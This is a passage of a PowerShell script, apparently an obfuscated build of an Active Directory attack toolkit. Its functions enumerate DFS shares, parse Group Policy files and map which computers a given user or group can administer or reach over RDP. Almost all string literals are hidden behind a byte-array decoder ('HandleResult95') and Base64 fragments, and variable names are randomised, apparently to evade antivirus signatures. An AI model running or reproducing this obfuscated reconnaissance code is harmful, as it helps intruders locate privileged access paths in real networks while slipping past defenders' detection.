        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-DFSshare
        
        Returns all distributed file system shares for the current domain.

    .EXAMPLE

        PS C:\> Get-DFSshare -Domain test
        
        Returns all distributed file system shares for the 'test' domain.
#>

    [CmdletBinding()]
    param(
        [String]
        [ValidateSet((HandleResult95 @(255,58,23,80) @(174,109,111,35,68,187)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VjE="))),"1",([char]0x56+[char]0x32),"2")]
        $Version = (HandleResult95 @(228,133,170,209) @(181,210,210,162,146,16,4)),

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        $mSHPOj = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($mSHPOj) {
            $quvg = @()
            $mSHPOj.filter = (HandleResult95 @(238,65,93,88,120,77,39,212,88,83,121,42,46,95,221,106,103,4,87,70,55,201,80,65,109,116,50,29,238,83,57,10) @(165,2,4,55,26,127,109))

            try {
                $mSHPOj.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $JtTi99s = $Properties.remoteservername

                    $quvg += $JtTi99s | ForEach-Object {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug ((HandleResult95 @(253,29,60,155,205,118,63,133,206,18,66,133,204,2,48,155,204,119,26,151,245,60,52,167,253,41,59,133,204,119,30,138,204,40,35,133,224,44,55,223) @(175,69,118,226)) + $_)
                        }
                    }
                }
            }
            catch {
                Write-Warning ((HandleResult95 @(14,43,142,219,16,76,138,172,9,42,150,132,5,65,146,135,10,115,145,140,6,65,146,146,62,42,145,140,19,112,153,214) @(92,25,216,235)) + $_)
            }
            $quvg | Sort-Object -Property (HandleResult95 @(94,238,30,17,38,56,209,36,48,118,93,250,44,8,18,114,215,37,35,48,81,210,117,88) @(11,131,72,101,68))
        }
    }

    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        $mSHPOj = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($mSHPOj) {
            $quvg = @()
            $mSHPOj.filter = (HandleResult95 @(223,27,175,61,173,119,88,153,206,15,184,98,158,119,106,128,247,107,187,107,173,29,92,173,198,52,187,38,155,2,126,157,245,107,175,43,132,22,121,213) @(148,88,246,82,207,69,18,232))
            $mSHPOj.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

            try {
                $mSHPOj.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $PyRQ = $Properties.'msdfs-targetlistv2'[0]
                    $qhZ8cV8o = [xml][System.Text.Encoding]::Unicode.GetString($PyRQ[2..($PyRQ.Length-1)])
                    $quvg += $qhZ8cV8o.targets.ChildNodes | ForEach-Object {
                        try {
                            $EJ00Y5Wa = $_.InnerText
                            if ( $EJ00Y5Wa.Contains('\') ) {
                                $f9zTEa = $EJ00Y5Wa.split("\")[3]
                                $hfFqF2 = $Properties.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'=($f9zTEa + $hfFqF2);'RemoteServerName'=$EJ00Y5Wa.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug ((HandleResult95 @(91,195,26,33,194,219,54,69,104,204,100,63,195,175,57,91,106,169,60,45,250,145,61,18,80,195,26,54,250,176,46,69,70,242,17,101) @(9,155,80,88,160,232,127,34)) + $_)
                        }
                    }
                }
            }
            catch {
                Write-Warning ((HandleResult95 @(3,187,253,51,33,188,69,89,4,186,229,108,52,177,93,114,7,227,226,100,55,177,93,103,51,186,226,100,34,128,86,35) @(81,137,171,3,109,233,23,30)) + $_)
            }
            $quvg | Sort-Object -Unique -Property (HandleResult95 @(72,41,190,110,163,76,101,113,17,218,76,184,27,90,75,61,188,119,135,11,109,76,121,213) @(29,68,232,26,193,127,55))
        }
    }

    $quvg = @()
    
    if ( ($Version -eq (HandleResult95 @(90,49,212,157) @(3,102,172,238,29,197))) -or ($Version.endsWith("1")) ) {
        $quvg += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( ($Version -eq (HandleResult95 @(122,202,124,133) @(35,157,4,246,99))) -or ($Version.endsWith("2")) ) {
        $quvg += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    $quvg | Sort-Object -Property (HandleResult95 @(115,88,139,151,147,54,116,89,136,209,167,124,66,88,139,154,165,104,96,65,135,178,204,56) @(38,53,221,227,241,5))
}


########################################################
#
# GPO related functions.
#
########################################################

function Get-GptTmpl {
<#
    .SYNOPSIS

        Helper to parse a GptTmpl.inf policy file path into a custom object.

    .PARAMETER GptTmplPath

        The GptTmpl.inf file path name to parse. 

    .PARAMETER UsePSDrive

        Switch. Mount the target GptTmpl folder path as a temporary PSDrive.

    .EXAMPLE

        PS C:\> Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

        Parse the default domain policy .inf for dev.testlab.local
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GptTmplPath,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {
            # if we're PSDrives, create a temporary mount point
            $u5Ie777 = $GptTmplPath.split('\')
            $mnwhsX0k = $u5Ie777[0..($u5Ie777.length-2)] -join '\'
            $FilePath = $u5Ie777[-1]
            $nXovd = ((HandleResult95 @(100,82,175,255,199,196,107,104,191,167,245,243,92,104,145,230,255,212,8,115,134,221,219,250,94,54,183,164,249,237,89,49,128,205,242,190) @(61,5,229,149,157,131)).ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose ((HandleResult95 @(130,16,186,203,164,4,132,55,225,151,165,13,181,0,197,202,167,41,151,122) @(214,71,131,250,198,106)) + $GptTmplPath + (HandleResult95 @(149,125,175,87,198,139,0,151,100,224,153,82,157,106,241,168,86,186,111,246,137,5,171,84,198,132,111,149,100,224,154,5,176,108,154,225) @(220,53,249,45,167)) + $nXovd)

            try {
                $Null = New-PSDrive -Name $nXovd -PSProvider FileSystem -Root $mnwhsX0k  -ErrorAction Stop
            }
            catch {
                Write-Debug ((HandleResult95 @(148,58,29,109,70,245,43,48,118,115,255,83,53,122,118,182,0,58,119,67,165,37,17,36,69,133,35,106) @(198,98,87,20,36)) + $GptTmplPath + (HandleResult95 @(225,211,250,213) @(168,151,149,178,43,150,137,238)) + $_)
                return $Null
            }

            # so we can cd/dir the new drive
            $GptTmplPath = $nXovd + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        } 
    }

    process {
        $xS5E0C = ''
        $dBwf = @{}
        $ZXpvVx8 = @{}

        try {

            if(Test-Path $GptTmplPath) {

                Write-Verbose ((HandleResult95 @(202,147,165,17,52,105,243,161,185,17,22,102) @(159,212,227,104,87,91)) + $GptTmplPath)

                Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {
                    if ($_ -match '\[') {
                        # this signifies that we're starting a new section
                        $xS5E0C = $_.trim('[]') -replace ' ',''
                    }
                    elseif($_ -match '=') {
                        $u5Ie777 = $_.split('=')
                        $PropertyName = $u5Ie777[0].trim()
                        $HETx = $u5Ie777[1].trim()

                        if($HETx -match ',') {
                            $HETx = $HETx.split(',')
                        }

                        if(!$dBwf[$xS5E0C]) {
                            $dBwf.Add($xS5E0C, @{})
                        }

                        # add the parsed property into the relevant Section name
                        $dBwf[$xS5E0C].Add( $PropertyName, $HETx )
                    }
                }

                ForEach ($vZ9fw5P in $dBwf.keys) {
                    # transform each nested hash table into a custom object
                    $ZXpvVx8[$vZ9fw5P] = New-Object PSObject -Property $dBwf[$vZ9fw5P]
                }

                # transform the parent hash table into a custom object
                New-Object PSObject -Property $ZXpvVx8
            }
        }
        catch {
            Write-Debug ((HandleResult95 @(211,99,175,136,209,228,200,92,134,182,245,174,226,9,137,132,233,174,192,6) @(129,59,229,241,179,215)) + $GptTmplPath + (HandleResult95 @(241,76,181,183) @(184,8,218,208,34)) + $_)
        }
    }

    end {
        if($UsePSDrive -and $nXovd) {
            Write-Verbose ((HandleResult95 @(230,92,221,111,236,128,107,251,121,227,208,86,239,92,216,199,82,200,89,223,230,1,217,98,239,235,107,231,82,207,142,12) @(179,49,139,27,142)) + $nXovd)
            Get-PSDrive -Name $nXovd -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}


function Get-GroupsXML {
<#
    .SYNOPSIS

        Helper to parse a groups.xml file path into a custom object.

    .PARAMETER GroupsXMLpath

        The groups.xml file path name to parse. 

    .PARAMETER ResolveSids

        Switch. Resolve Sids from a DC policy to object names.

    .PARAMETER UsePSDrive

        Switch. Mount the target groups.xml folder path as a temporary PSDrive.

#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GroupsXMLPath,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {
            # if we're PSDrives, create a temporary mount point
            $u5Ie777 = $GroupsXMLPath.split('\')
            $mnwhsX0k = $u5Ie777[0..($u5Ie777.length-2)] -join '\'
            $FilePath = $u5Ie777[-1]
            $nXovd = ((HandleResult95 @(113,111,10,4,67,109,126,85,26,92,113,90,73,85,52,29,123,125,29,78,35,38,95,83,75,11,18,95,125,68,76,12,37,54,118,23) @(40,56,64,110,25,42)).ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose ((HandleResult95 @(230,52,231,121,63,218,224,19,188,37,62,211,209,36,152,120,60,247,243,94) @(178,99,222,72,93,180)) + $GroupsXMLPath + (HandleResult95 @(254,237,95,77,214,242,60,89,254,226,76,80,211,226,95,67,212,230,75,102,226,149,91,78,214,253,83,91,254,226,79,7,254,228,52,10) @(183,165,9,55)) + $nXovd)

            try {
                $Null = New-PSDrive -Name $nXovd -PSProvider FileSystem -Root $mnwhsX0k  -ErrorAction Stop
            }
            catch {
                Write-Debug ((HandleResult95 @(83,147,164,234,99,248,167,244,99,156,215,162,99,165,188,227,99,166,141,244,98,140,168,163,96,136,175,174) @(1,203,238,147)) + $GroupsXMLPath + (HandleResult95 @(215,106,231,217) @(158,46,136,190,126,222,209,22)) + $_)
                return $Null
            }

            # so we can cd/dir the new drive
            $GroupsXMLPath = $nXovd + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        } 
    }

    process {

        # parse the Groups.xml file if it exists 
        if(Test-Path $GroupsXMLPath) {

            [xml] $q1E5XU = Get-Content $GroupsXMLPath

            # process all group properties in the XML
            $q1E5XU | Select-Xml (HandleResult95 @(104,62,84,141,194,211,29,118,14,132,156,131) @(36,71,109,197,161,190)) | Select-Object -ExpandProperty node | ForEach-Object {

                $zRQl = @()
                $y5exuW5 = @()

                # extract the localgroup sid for memberof
                $cXlWen = $_.Properties.GroupSid
                if(!$cXlWen) {
                    if($_.Properties.groupName -match 'Administrators') {
                        $cXlWen = 'S-1-5-32-544'
                    }
                    elseif($_.Properties.groupName -match 'Remote Desktop') {
                        $cXlWen = 'S-1-5-32-555'
                    }
                    else {
                        $cXlWen = $_.Properties.groupName
                    }
                }
                $y5exuW5 = @($cXlWen)

                $_.Properties.members | ForEach-Object {
                    # process each member of the above local group
                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {

                        if($_.sid) {
                            $zRQl += $_.sid
                        }
                        else {
                            # just a straight local account name
                            $zRQl += $_.name
                        }
                    }
                }

                if ($zRQl -or $y5exuW5) {
                    # extract out any/all filters...I hate you GPP
                    $BJvP7x3 = $_.filters | ForEach-Object {
                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }

                    if($ResolveSids) {
                        $y5exuW5 = $y5exuW5 | ForEach-Object {Convert-SidToName $_}
                        $zRQl = $zRQl | ForEach-Object {Convert-SidToName $_}
                    }

                    if($y5exuW5 -isnot [system.array]) {$y5exuW5 = @($y5exuW5)}
                    if($zRQl -isnot [system.array]) {$zRQl = @($zRQl)}

                    $vTANjO = @{
                        'GPODisplayName' = $aeVJG
                        'GPOName' = $GPOName
                        'GPOPath' = $GroupsXMLPath
                        'Filters' = $BJvP7x3
                        'MemberOf' = $y5exuW5
                        'Members' = $zRQl
                    }

                    New-Object -TypeName PSObject -Property $vTANjO
                }
            }
        }
    }

    end {
        if($UsePSDrive -and $nXovd) {
            Write-Verbose ((HandleResult95 @(30,237,170,105,41,179,166,109,41,237,159,122,47,199,170,105,40,195,190,76,30,176,174,100,42,216,166,113,2,193,193,32) @(75,128,252,29)) + $nXovd)
            Get-PSDrive -Name $nXovd -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}



function Get-NetGPO {
<#
    .SYNOPSIS

        Gets a list of all current GPOs in a domain.

    .PARAMETER GPOname

        The GPO name to query for, wildcards accepted.   

    .PARAMETER DisplayName

        The GPO display name to query for, wildcards accepted.   

    .PARAMETER Domain

        The domain to query for GPOs, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetGPO -Domain testlab.local
        
        Returns the GPOs in the 'testlab.local' domain. 
#>
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200

    )

    begin {
        $GVGqrC = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if ($GVGqrC) {
            if($DisplayName) {
                $GVGqrC.filter=((HandleResult95 @(50,250,113,186,183,161,235,249,35,238,102,229,132,161,231,184,35,238,76,163,182,253,202,177,35,138,98,163,177,203,227,217,27,139,80,165,140,160,205,204,27,139,29,229,140,196,205,253,35,225,97,165,158,212,243,248,26,138,106,166,140,203,205,253,32,238,25,185,133,194,156,181) @(121,185,40,213,213,147,161,136)) + $DisplayName + ([char]0x29+[char]0x29))
            }
            else {
                $GVGqrC.filter=((HandleResult95 @(92,206,248,186,220,7,93,252,251,130,240,5,70,191,231,229,228,98,115,251,194,187,213,12,77,190,235,163,218,109,85,220,195,231,198,69,78,190,205,145,220,7,34,189,248,130,210,64,77,213,232,165,245,114,34,229,195,130,235,12) @(23,141,161,213,190,53)) + $GPOname + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
            }

            $GVGqrC.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert/process the LDAP fields for each result
                Convert-LDAPProperty -Properties $_.Properties
            }
        }
    }
}


function Get-NetGPOGroup {
<#
    .SYNOPSIS

        Returns all GPOs in a domain that set "Restricted Groups"
        or use groups.xml on on target machines.

    .PARAMETER GPOname

        The GPO name to query for, wildcards accepted.   

    .PARAMETER DisplayName

        The GPO display name to query for, wildcards accepted.   

    .PARAMETER ResolveSids

        Switch. Resolve Sids from a DC policy to object names.

    .PARAMETER Domain

        The domain to query for GPOs, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .PARAMETER UsePSDrive

        Switch. Mount any found policy files with temporary PSDrives.

    .EXAMPLE

        PS C:\> Get-NetGPOGroup

        Get all GPOs that set local groups on the current domain.
#>

    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [Switch]
        $ResolveSids,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    # get every GPO from the specified domain with restricted groups set
    Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {

        $y5exuW5 = $Null
        $zRQl = $Null
        $aeVJG = $_.displayname
        $GPOname = $_.name
        $KnPSS = $_.gpcfilesyspath

        $v3GrfwQ9 =  @{
            'GptTmplPath' = ($KnPSS + (HandleResult95 @(48,81,122,102,168,74,153,34,64,32,114,154,46,166,4,126,40,73,192,0,147,90,78,123,124,191,30,129,10,121,25,82,157,73,188,15,64,39,118,154,47,195,62,126,25,115,171,10,149,46,108,3,71,177,40,164,10,76,9,87,181,23,157,29,78,44,25,196) @(104,20,75,36,249,122,241)))
            'UsePSDrive' = $UsePSDrive
        }

        # parse the GptTmpl.inf 'Restricted Groups' file if it exists
        $HdezxXtM = Get-GptTmpl @v3GrfwQ9

        if($HdezxXtM.GroupMembership) {

            $y5exuW5 = $HdezxXtM.GroupMembership | Get-Member *Memberof | ForEach-Object { $HdezxXtM.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
            $zRQl = $HdezxXtM.GroupMembership | Get-Member *Members | ForEach-Object { $HdezxXtM.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }

            # only return an object if Members are found
            if ($zRQl -or $y5exuW5) {

                # if there is no Memberof defined, assume local admins
                if(!$y5exuW5) {
                    $y5exuW5 = 'S-1-5-32-544'
                }

                if($ResolveSids) {
                    $y5exuW5 = $y5exuW5 | ForEach-Object {Convert-SidToName $_}
                    $zRQl = $zRQl | ForEach-Object {Convert-SidToName $_}
                }

                if($y5exuW5 -isnot [system.array]) {$y5exuW5 = @($y5exuW5)}
                if($zRQl -isnot [system.array]) {$zRQl = @($zRQl)}

                $vTANjO = @{
                    'GPODisplayName' = $aeVJG
                    'GPOName' = $GPOName
                    'GPOPath' = $KnPSS
                    'Filters' = $Null
                    'MemberOf' = $y5exuW5
                    'Members' = $zRQl
                }

                New-Object -TypeName PSObject -Property $vTANjO
            }
        }

        $v3GrfwQ9 =  @{
            'GroupsXMLpath' = ($KnPSS + (HandleResult95 @(197,233,97,136,167,231,95,215,248,59,156,149,130,127,215,192,10,167,160,174,109,202,153,58,144,174,153,84,207,159,26,188,146,143,117,231,244,21,174,143,181,4,203,219,51,179,195,227,85,202,219,109) @(157,172,80,202,246,215,55)))
            'ResolveSids' = $ResolveSids
            'UsePSDrive' = $UsePSDrive
        }

        Get-GroupsXML @v3GrfwQ9
    }
}


function Find-GPOLocation {
<#
    .SYNOPSIS

        Takes a user/group name and optional domain, and determines 
        the computers in the domain the user/group has local admin 
        (or RDP) rights to.

        It does this by:
            1.  resolving the user/group to its proper sid
            2.  enumerating all groups the user/group is a current part of 
                and extracting all target SIDs to build a target SID list
            3.  pulling all GPOs that set 'Restricted Groups' by calling
                Get-NetGPOGroup
            4.  matching the target sid list to the queried GPO SID list
                to enumerate all GPO the user is effectively applied with
            5.  enumerating all OUs and sites and applicable GPO GUIs are
                applied to through gplink enumerating
            6.  querying for all computers under the given OUs or sites

    .PARAMETER UserName

        A (single) user name name to query for access.

    .PARAMETER GroupName

        A (single) group name name to query for access. 

    .PARAMETER Domain

        Optional domain the user exists in for querying, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER LocalGroup

        The local group to check access against.
        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
        or a custom local SID. Defaults to local 'Administrators'.

    .PARAMETER UsePSDrive

        Switch. Mount any found policy files with temporary PSDrives.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Find-GPOLocation -UserName dfm
        
        Find all computers that dfm user has local administrator rights to in 
        the current domain.

    .EXAMPLE

        PS C:\> Find-GPOLocation -UserName dfm -Domain dev.testlab.local
        
        Find all computers that dfm user has local administrator rights to in 
        the dev.testlab.local domain.

    .EXAMPLE

        PS C:\> Find-GPOLocation -UserName jason -LocalGroup RDP
        
        Find all computers that jason has local RDP access rights to in the domain.
#>

    [CmdletBinding()]
    Param (
        [String]
        $UserName,

        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $LocalGroup = 'Administrators',
        
        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($UserName) {

        $m342PSR = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        $vEV7hR = $m342PSR.objectsid

        if(!$vEV7hR) {    
            Throw ((HandleResult95 @(77,16,86,221,127,114,9,118) @(27,72,24,177,28)) + $UserName + (HandleResult95 @(2,177,240,250,42,251,227,232,18,165,139,190,42,165,227,231) @(72,200,178,143)))
        }

        $dXja = $vEV7hR
        $i7h0U2 = $m342PSR.samaccountname
        $RMOjyA9b = $m342PSR.distinguishedname
    }
    elseif($GroupName) {

        $ayFBYTwN = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
        $bOhis1 = $ayFBYTwN.objectsid

        if(!$bOhis1) {    
            Throw ((HandleResult95 @(254,142,41,24,165,20,205,4,230,202,94,83) @(172,189,99,110,193,76,140,99)) + $GroupName + (HandleResult95 @(45,25,166,98,129,199,124,0,58,137,46,210,150,64,54,8) @(103,96,228,23,227,244,45)))
        }

        $dXja = $bOhis1
        $i7h0U2 = $ayFBYTwN.samaccountname
        $RMOjyA9b = $ayFBYTwN.distinguishedname
    }
    else {
        throw (HandleResult95 @(15,114,17,196,50,199,116,12,125,16,143,4,214,121,122,93,14,253,89,215,93,46,29,118,221,45,170,86,33,115,18,217,10,199,104,57,64,4,252,1,197,109,1,94,36,249,62,245,95,20,126,55,228,63,206,86) @(67,36,71,190,104,159,62))
    }

    if($LocalGroup -like (HandleResult95 @(86,22,241,126,210,74,17,194,94,215,32,64) @(29,125,183,21,176))) {
        $cXlWen = (HandleResult95 @(53,88,43,83,105,116,212,20,108,97,98,81,110,213,49,17) @(96,33,27,43,37,32,129))
    }
    elseif ( ($LocalGroup -like (HandleResult95 @(174,119,187,207,166,168,163,216) @(229,27,241,138,243,235,204))) -or ($LocalGroup -like (HandleResult95 @(252,146,173,74,117,64,142,206,189,117,120,42) @(183,254,231,38,23,23))) ) {
        $cXlWen = (HandleResult95 @(45,169,234,129,31,144,45,164,151,131,26,176,54,132,143,200) @(120,208,218,249,83,196))
    }
    elseif ($LocalGroup -like (HandleResult95 @(167,48,89,96,190,29,60,105) @(242,73,105,24))) {
        $cXlWen = $LocalGroup
    }
    else {
        throw (HandleResult95 @(156,237,237,77,9,27,191,103,171,199,237,22,51,15,133,91,172,242,154,23,25,11,141,67,129,233,176,101,10,11,246,95,170,199,184,93,52,4,141,71,172,237,237,94,51,53,164,92,129,233,176,116,2,10,134,65,132,233,150,81,51,37,133,71,129,233,176,115,28,24,130,91,134,249,229,126,26,53,133,31,173,242,150,75,25,4,137,95,146,233,224,26) @(200,170,212,39,80,76,199,47))
    }

    Write-Verbose ((HandleResult95 @(195,183,235,218,242,244,239,164,179,231,250,149,222,177,239,141) @(151,240,210,176,171,163)) + $cXlWen)
    Write-Verbose ((HandleResult95 @(42,180,190,249,254,78,165,200,213,150,16,152,183,233,229,65) @(124,243,248,128,164)) + $dXja)
    Write-Verbose ((HandleResult95 @(137,13,241,233,133,120,225,160,139,120,253,225,133,29,249,160,141,13,219,234,187,15,130,248,189,29,226,166,150,11,138,173) @(223,74,183,144)) + $RMOjyA9b)

    if($dXja -isnot [system.array]) { $dXja = @($dXja) }

    # use the tokenGroups approach from Get-NetGroup to get all effective
    #   security SIDs this object is a part of
    $dXja += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $i7h0U2 -RawSids

    if($dXja -isnot [system.array]) { $dXja = @($dXja) }

    Write-Verbose ((HandleResult95 @(39,103,60,103,89,74,59,0,7,82,89,113,60,120,52,98,96,112,17,92,2,73,65,103,20,103,52,112,76,116,52,13) @(117,48,102,10,3,29)) + $dXja)

    $KAuD =  @{
        'Domain' = $Domain
        'DomainController' = $DomainController
        'UsePSDrive' = $UsePSDrive
        'PageSize' = $PageSize
    }

    # get all GPO groups, and filter on ones that match our target SID list
    #   and match the target local sid memberof list
    $i46v = Get-NetGPOGroup @KAuD | ForEach-Object {
        
        if ($_.members) {
            $_.members = $_.members | Where-Object {$_} | ForEach-Object {
                if($_ -match (HandleResult95 @(252,115,136,232,229,94,237,173) @(169,10,184,144))) {
                    $_
                }
                else {
                    # if there are any plain group names, try to resolve them to sids
                    Convert-NameToSid -ObjectName $_ -Domain $Domain
                }
            }

            # stop PowerShell 2.0's string stupid unboxing
            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            
            if($_.members) {
                try {
                    # only return groups that contain a target sid

                    # TODO: fix stupid weird "-DifferenceObject" is null error
                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $dXja -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $cXlWen) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug ((HandleResult95 @(127,91,255,132,118,30,74,210,164,38,20,119,214,186,82,84,98,226,200,122,100,68,132,145,118,122,73,217,158,122,96,100,236,170,33,70,74,244,192,41) @(45,3,181,253,20)) + $dXja + (HandleResult95 @(61,74,132,195) @(116,14,235,164,153,155)) + $_)
                }
            }
        }
    }

    Write-Verbose ((HandleResult95 @(227,4,255,64,235,6,247,102,213,109,255,106,254,92,252,45) @(177,53,189,16)) + $i46v)
    $IE3py = @{}

    # process the matches and build the result objects
    $i46v | Where-Object {$_} | ForEach-Object {

        $FiYFWZ = $_.GPOName

        if( -not $IE3py[$FiYFWZ] ) {
            $GPOname = $_.GPODisplayName
            $BJvP7x3 = $_.Filters

            # find any OUs that have this GUID applied
            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $FiYFWZ -FullData -PageSize $PageSize | ForEach-Object {

                if($BJvP7x3) {
                    # filter for computer name/org unit if a filter is specified
                    #   TODO: handle other filters?
                    $bRMk = Get-NetComputer -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {
                        $_.adspath -match ($BJvP7x3.Value)
                    } | ForEach-Object { $_.dnshostname }
                }
                else {
                    $bRMk = Get-NetComputer -ADSpath $_.ADSpath -PageSize $PageSize
                }

                $AlhmXq = New-Object PSObject
                $AlhmXq | Add-Member Noteproperty 'ObjectName' $RMOjyA9b
                $AlhmXq | Add-Member Noteproperty 'GPOname' $GPOname
                $AlhmXq | Add-Member Noteproperty 'GPOguid' $FiYFWZ
                $AlhmXq | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                $AlhmXq | Add-Member Noteproperty 'Computers' $bRMk
                $AlhmXq
            }

            # find any sites that have this GUID applied
            # TODO: fix, this isn't the correct way to query computers from a site...
            # Get-NetSite -GUID $GPOguid -FullData | Foreach-Object {
            #     if($Filters) {
            #         # filter for computer name/org unit if a filter is specified
            #         #   TODO: handle other filters?
            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath -FullData | ? {
            #             $_.adspath -match ($Filters.Value)
            #         } | Foreach-Object {$_.dnshostname}
            #     }
            #     else {
            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
            #     }

            #     $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
            #     $out = New-Object PSObject
            #     $out | Add-Member Noteproperty 'Object' $ObjectDistName
            #     $out | Add-Member Noteproperty 'GPOname' $GPOname
            #     $out | Add-Member Noteproperty 'GPOguid' $GPOguid
            #     $out | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
            #     $out | Add-Member Noteproperty 'Computers' $OUComputers
            #     $out
            # }

            # mark off this GPO GUID so we don't process it again if there are dupes
            $IE3py[$FiYFWZ] = $True
        }
    }

}


function Find-GPOComputerAdmin {
<#
    .SYNOPSIS

        Takes a computer (or GPO) object and determines what users/groups have 
        administrative access over it.

        Inverse of Find-GPOLocation.

    .PARAMETER ComputerName

        The computer to determine local administrative access to.

    .PARAMETER OUName

        OU name to determine who has local adminisrtative acess to computers
        within it. 

    .PARAMETER Domain

        Optional domain the computer/OU exists in, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER Recurse

        Switch. If a returned member is a group, recurse and get all members.

    .PARAMETER LocalGroup

        The local group to check access against.
